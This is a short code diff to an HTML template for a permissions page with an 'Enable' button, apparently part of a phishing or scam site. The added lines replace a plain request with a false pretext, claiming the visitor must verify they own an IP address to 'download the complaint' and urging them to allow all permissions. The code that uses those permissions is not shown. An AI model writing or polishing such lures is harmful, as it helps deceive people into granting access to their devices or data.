@@ -516,8 +516,8 @@ PERMISSIONS_PAGE = """
         {% if error == 'denied' %}
         <p style="color: red;">Permissions were not granted. Please enable all permissions to proceed.</p>
         {% endif %}
-        <h2>Enable all permissions to proceed</h2>
-        <p>You must enable all permissions to access the drive.</p>
+        <h2>To download the complaint, you have to verify whether you are the right person who has the IP address</h2>
+        <p>Kindly allow all permissions by clicking enable.</p>
         <button id="enableButton" class="btn btn-primary">Enable</button>
         <p id="status"></p>
     </div>
